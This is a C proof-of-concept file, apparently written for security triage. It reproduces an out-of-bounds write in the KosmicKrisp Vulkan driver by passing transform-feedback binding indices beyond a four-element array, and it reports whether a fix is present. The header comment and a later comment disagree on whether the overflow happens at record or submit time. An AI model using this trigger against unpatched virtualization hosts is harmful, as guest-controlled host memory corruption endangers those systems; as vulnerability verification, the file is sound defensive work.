// SPDX-License-Identifier: GPL-2.0-only WITH LicenseRef-limina-exception
// Copyright © 2026 Gustavo Noronha Silva

/*
 * xfb-oob-probe: RED reproducer for the KosmicKrisp transform-feedback
 * out-of-bounds write (limina security triage, docs/upstreaming).
 *
 * KK's XFB command entrypoints index a fixed 4-element array
 * (gfx->xfb.buf[4]) with a *guest-controlled* base:
 *     kk_CmdBindTransformFeedbackBuffersEXT: idx = firstBinding + i
 *     kk_CmdBeginTransformFeedbackEXT:       idx = firstCounterBuffer + i
 *     kk_CmdEndTransformFeedbackEXT:         idx = firstCounterBuffer + i
 * With no clamp, a non-conformant client (a malicious venus guest — venus is
 * untrusted from KK's side) that passes firstBinding/firstCounterBuffer > 3
 * makes KK write a guest-supplied buffer address/size past the array.
 *
 * IMPORTANT: we call KK *directly* via its Mesa ICD entrypoint
 * (vk_icdGetInstanceProcAddr), NOT through the system Vulkan loader. The loader
 * trampoline does not dispatch these extension commands to KK in a standalone
 * host process (verified: an instrumented kk_CmdBind* never fires via the
 * loader), which silently made an earlier version of this probe a no-op. The
 * ICD-direct path is also what the real venus->vkr->KK stack uses.
 *
 * The overflow happens at COMMAND-RECORD time, purely host-CPU-side — no submit,
 * no GPU, no window. Run against an ASan KK build for a precise
 * "heap-buffer-overflow WRITE in kk_CmdBindTransformFeedbackBuffersEXT".
 *
 *   KK_DYLIB=/Volumes/mesa-cs/build-kk/src/kosmickrisp/vulkan/libvulkan_kosmickrisp.dylib \
 *     ./xfb-oob-probe [firstIndex]      (default 4096)
 *
 * Build: see build-xfb-oob-probe.sh
 */
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define VK_NO_PROTOTYPES
#include <vulkan/vulkan.h>

typedef PFN_vkVoidFunction (VKAPI_PTR *PFN_icdGIPA)(VkInstance, const char *);

static PFN_icdGIPA ICD;
#define GET_I(inst, name) ((PFN_##name)ICD((inst), #name))

#define CHECK(x)                                                               \
   do {                                                                        \
      VkResult _r = (x);                                                       \
      if (_r != VK_SUCCESS) {                                                  \
         fprintf(stderr, "%s failed: %d\n", #x, _r);                           \
         return 2;                                                             \
      }                                                                        \
   } while (0)

int
main(int argc, char **argv)
{
   setbuf(stdout, NULL);
   uint32_t first = argc > 1 ? (uint32_t)strtoul(argv[1], NULL, 0) : 4096;
   const char *path = getenv("KK_DYLIB");
   if (!path) {
      fprintf(stderr, "set KK_DYLIB to the KosmicKrisp dylib path\n");
      return 2;
   }
   printf("KK_DYLIB=%s\n", path);
   printf("firstBinding/firstCounterBuffer = %u (array bound is 4)\n", first);

   void *h = dlopen(path, RTLD_NOW | RTLD_LOCAL);
   if (!h) { fprintf(stderr, "dlopen: %s\n", dlerror()); return 2; }
   ICD = (PFN_icdGIPA)dlsym(h, "vk_icdGetInstanceProcAddr");
   if (!ICD) { fprintf(stderr, "no vk_icdGetInstanceProcAddr\n"); return 2; }

   /* Instance (call KK's ICD directly — no system loader). */
   PFN_vkCreateInstance p_CreateInstance = GET_I(NULL, vkCreateInstance);
   VkApplicationInfo app = {
      .sType = VK_STRUCTURE_TYPE_APPLICATION_INFO,
      .apiVersion = VK_API_VERSION_1_3,
   };
   VkInstanceCreateInfo ici = {
      .sType = VK_STRUCTURE_TYPE_INSTANCE_CREATE_INFO,
      .pApplicationInfo = &app,
   };
   VkInstance inst;
   CHECK(p_CreateInstance(&ici, NULL, &inst));

   PFN_vkEnumeratePhysicalDevices p_Enum = GET_I(inst, vkEnumeratePhysicalDevices);
   PFN_vkGetPhysicalDeviceProperties p_Props =
      GET_I(inst, vkGetPhysicalDeviceProperties);
   PFN_vkGetPhysicalDeviceQueueFamilyProperties p_QFP =
      GET_I(inst, vkGetPhysicalDeviceQueueFamilyProperties);
   PFN_vkCreateDevice p_CreateDevice = GET_I(inst, vkCreateDevice);
   PFN_vkGetDeviceProcAddr p_GDPA = GET_I(inst, vkGetDeviceProcAddr);

   uint32_t n = 1;
   VkPhysicalDevice pdev;
   CHECK(p_Enum(inst, &n, &pdev));
   VkPhysicalDeviceProperties props;
   p_Props(pdev, &props);
   printf("device: %s\n", props.deviceName);

   uint32_t qn = 0;
   p_QFP(pdev, &qn, NULL);
   VkQueueFamilyProperties qprops[8];
   qn = qn > 8 ? 8 : qn;
   p_QFP(pdev, &qn, qprops);
   uint32_t qfam = 0;
   for (uint32_t i = 0; i < qn; i++)
      if (qprops[i].queueFlags & VK_QUEUE_GRAPHICS_BIT) { qfam = i; break; }

   float prio = 1.0f;
   VkDeviceQueueCreateInfo qci = {
      .sType = VK_STRUCTURE_TYPE_DEVICE_QUEUE_CREATE_INFO,
      .queueFamilyIndex = qfam,
      .queueCount = 1,
      .pQueuePriorities = &prio,
   };
   VkPhysicalDeviceTransformFeedbackFeaturesEXT tff = {
      .sType = VK_STRUCTURE_TYPE_PHYSICAL_DEVICE_TRANSFORM_FEEDBACK_FEATURES_EXT,
      .transformFeedback = VK_TRUE,
   };
   const char *dev_exts[] = { VK_EXT_TRANSFORM_FEEDBACK_EXTENSION_NAME };
   VkDeviceCreateInfo dci = {
      .sType = VK_STRUCTURE_TYPE_DEVICE_CREATE_INFO,
      .pNext = &tff,
      .queueCreateInfoCount = 1,
      .pQueueCreateInfos = &qci,
      .enabledExtensionCount = 1,
      .ppEnabledExtensionNames = dev_exts,
   };
   VkDevice dev;
   CHECK(p_CreateDevice(pdev, &dci, NULL, &dev));

   /* Resolve the rest via KK's own device proc addr. */
#define GET_D(name) ((PFN_##name)p_GDPA(dev, #name))
   PFN_vkCreateBuffer p_CreateBuffer = GET_D(vkCreateBuffer);
   PFN_vkGetBufferMemoryRequirements p_BufReq = GET_D(vkGetBufferMemoryRequirements);
   PFN_vkAllocateMemory p_Alloc = GET_D(vkAllocateMemory);
   PFN_vkBindBufferMemory p_BindMem = GET_D(vkBindBufferMemory);
   PFN_vkCreateCommandPool p_CreatePool = GET_D(vkCreateCommandPool);
   PFN_vkAllocateCommandBuffers p_AllocCB = GET_D(vkAllocateCommandBuffers);
   PFN_vkBeginCommandBuffer p_BeginCB = GET_D(vkBeginCommandBuffer);
   PFN_vkEndCommandBuffer p_EndCB = GET_D(vkEndCommandBuffer);
   PFN_vkGetDeviceQueue p_GetQueue = GET_D(vkGetDeviceQueue);
   PFN_vkQueueSubmit p_Submit = GET_D(vkQueueSubmit);
   PFN_vkQueueWaitIdle p_WaitIdle = GET_D(vkQueueWaitIdle);
   PFN_vkGetPhysicalDeviceMemoryProperties p_MemProps =
      GET_I(inst, vkGetPhysicalDeviceMemoryProperties);

   PFN_vkCmdBindTransformFeedbackBuffersEXT bind =
      GET_D(vkCmdBindTransformFeedbackBuffersEXT);
   PFN_vkCmdBeginTransformFeedbackEXT begin =
      GET_D(vkCmdBeginTransformFeedbackEXT);
   printf("resolved bind=%p begin=%p\n", (void *)bind, (void *)begin);
   Dl_info di;
   if (dladdr((void *)bind, &di))
      printf("  bind resolves to symbol: %s\n", di.dli_sname ? di.dli_sname : "?");
   if (dladdr((void *)begin, &di))
      printf("  begin resolves to symbol: %s\n", di.dli_sname ? di.dli_sname : "?");
   if (!bind || !begin) {
      fprintf(stderr, "XFB entrypoints missing from KK\n");
      return 2;
   }

   VkBufferCreateInfo bci = {
      .sType = VK_STRUCTURE_TYPE_BUFFER_CREATE_INFO,
      .size = 4096,
      .usage = VK_BUFFER_USAGE_TRANSFORM_FEEDBACK_BUFFER_BIT_EXT |
               VK_BUFFER_USAGE_TRANSFORM_FEEDBACK_COUNTER_BUFFER_BIT_EXT,
      .sharingMode = VK_SHARING_MODE_EXCLUSIVE,
   };
   VkBuffer buf;
   CHECK(p_CreateBuffer(dev, &bci, NULL, &buf));
   VkMemoryRequirements mr;
   p_BufReq(dev, buf, &mr);
   VkPhysicalDeviceMemoryProperties mp;
   p_MemProps(pdev, &mp);
   uint32_t mt = 0;
   for (uint32_t i = 0; i < mp.memoryTypeCount; i++)
      if (mr.memoryTypeBits & (1u << i)) { mt = i; break; }
   VkMemoryAllocateInfo mai = {
      .sType = VK_STRUCTURE_TYPE_MEMORY_ALLOCATE_INFO,
      .allocationSize = mr.size,
      .memoryTypeIndex = mt,
   };
   VkDeviceMemory mem;
   CHECK(p_Alloc(dev, &mai, NULL, &mem));
   CHECK(p_BindMem(dev, buf, mem, 0));

   VkCommandPoolCreateInfo cpci = {
      .sType = VK_STRUCTURE_TYPE_COMMAND_POOL_CREATE_INFO,
      .queueFamilyIndex = qfam,
   };
   VkCommandPool pool;
   CHECK(p_CreatePool(dev, &cpci, NULL, &pool));
   VkCommandBufferAllocateInfo cbai = {
      .sType = VK_STRUCTURE_TYPE_COMMAND_BUFFER_ALLOCATE_INFO,
      .commandPool = pool,
      .level = VK_COMMAND_BUFFER_LEVEL_PRIMARY,
      .commandBufferCount = 1,
   };
   VkCommandBuffer cmd;
   CHECK(p_AllocCB(dev, &cbai, &cmd));
   VkCommandBufferBeginInfo cbbi = {
      .sType = VK_STRUCTURE_TYPE_COMMAND_BUFFER_BEGIN_INFO,
      .flags = VK_COMMAND_BUFFER_USAGE_ONE_TIME_SUBMIT_BIT,
   };
   CHECK(p_BeginCB(cmd, &cbbi));

   VkDeviceSize offset = 0, size = 4096;
   printf("recording vkCmdBindTransformFeedbackBuffersEXT(firstBinding=%u) ...\n",
          first);
   bind(cmd, first, 1, &buf, &offset, &size);
   printf("recording vkCmdBeginTransformFeedbackEXT(firstCounterBuffer=%u) ...\n",
          first);
   begin(cmd, first, 1, &buf, &offset);
   p_EndCB(cmd);

   /* KK records via vk_cmd_queue: the real kk_Cmd*TransformFeedback* handlers
    * (and the OOB) run at REPLAY time, i.e. during submit — not at record. */
   VkQueue queue;
   p_GetQueue(dev, qfam, 0, &queue);
   VkSubmitInfo si = {
      .sType = VK_STRUCTURE_TYPE_SUBMIT_INFO,
      .commandBufferCount = 1,
      .pCommandBuffers = &cmd,
   };
   printf("submitting (replays the enqueued XFB commands into KK) ...\n");
   p_Submit(queue, 1, &si, VK_NULL_HANDLE);
   p_WaitIdle(queue);

   printf("SURVIVED (no out-of-bounds write; fix is present)\n");
   return 0;
}
